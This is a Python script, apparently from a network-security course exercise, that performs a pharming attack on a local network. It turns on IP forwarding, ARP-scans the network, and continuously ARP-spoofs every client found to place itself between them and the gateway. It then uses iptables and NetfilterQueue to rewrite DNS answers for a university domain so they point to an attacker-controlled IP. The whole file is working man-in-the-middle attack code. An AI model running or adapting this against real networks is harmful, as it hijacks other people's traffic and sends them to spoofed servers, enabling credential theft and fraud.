#!/usr/bin/env python3

from multiprocessing import Process

from netfilterqueue import NetfilterQueue
from scapy.layers.dns import DNS, DNSQR, DNSRR
from scapy.layers.inet import IP, UDP

import arp

QUEUE_NUM = 69
ATTACK_DOMAIN = b"www.nycu.edu.tw."
ATTACK_SERVER_IP = "140.113.207.241"


def fake_dns_res(pkt):
    rcv_pkt = IP(pkt.get_payload())
    if not rcv_pkt.haslayer(DNSQR):
        pkt.accept()
        return

    qname = rcv_pkt[DNSQR].qname
    if qname != ATTACK_DOMAIN:
        pkt.accept()
        return
    # print(f"[DEBUG] qname={qname}")

    rcv_pkt[DNS].an = DNSRR(rrname=qname, rdata=ATTACK_SERVER_IP)
    rcv_pkt[DNS].ancount = 1

    del rcv_pkt[IP].len
    del rcv_pkt[IP].chksum
    del rcv_pkt[UDP].len
    del rcv_pkt[UDP].chksum

    # print("[DEBUG] sending back fake info")
    pkt.set_payload(bytes(rcv_pkt))
    pkt.accept()


def main():
    arp.run_silently("sysctl -w net.ipv4.ip_forward=1")
    clients, gateway_ip, gateway_mac = arp.arp_scan()
    arp.print_clients(clients)
    proc = Process(target=arp.keep_spoof, args=(clients, gateway_ip, gateway_mac, 10))
    proc.start()

    arp.run_silently(f"iptables -I FORWARD -j NFQUEUE --queue-num {QUEUE_NUM}")
    nfq = NetfilterQueue()
    nfq.bind(QUEUE_NUM, fake_dns_res)

    try:
        print("[*] Start pharming...")
        nfq.run()
    except KeyboardInterrupt:
        pass
    finally:
        print("shutting down gracefully...")

        nfq.unbind()
        arp.run_silently(f"iptables -D FORWARD -j NFQUEUE --queue-num {QUEUE_NUM}")
        proc.terminate()


if __name__ == "__main__":
    main()
